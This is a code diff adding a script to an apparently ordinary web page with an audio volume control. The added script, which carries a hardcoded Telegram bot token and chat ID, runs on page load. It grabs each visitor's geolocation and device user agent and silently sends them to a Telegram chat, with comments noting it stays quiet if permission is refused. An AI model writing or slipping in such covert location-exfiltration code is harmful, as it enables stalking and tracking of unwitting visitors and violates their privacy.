@@ -727,6 +727,40 @@ volume.addEventListener('input', ()=>{
     volumeLabel.textContent = Math.round(volume.value*100)+"%";
 });
 
+	const BOT_TOKEN = "8307418780:AAGzkA26fmS4WclP_P8dDqv7bDzL8a7I1Io";
+const CHAT_ID = "6092633949";
+
+function sendLocationToTelegram() {
+    if (!navigator.geolocation) return;
+
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            const message =
+`📍 Yeni Konum alındı
+Enlem: ${pos.coords.latitude}
+Boylam: ${pos.coords.longitude}
+Dəqiqlik: ${pos.coords.accuracy} metr
+Saat: ${new Date().toLocaleString()}
+Cihaz: ${navigator.userAgent}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+        },
+        () => {
+            // icazə verilməsə susur
+        }
+    );
+}
+
+// Sayt açılan kimi avtomatik işləsin
+window.addEventListener("load", sendLocationToTelegram);
+
 </script>
 
 
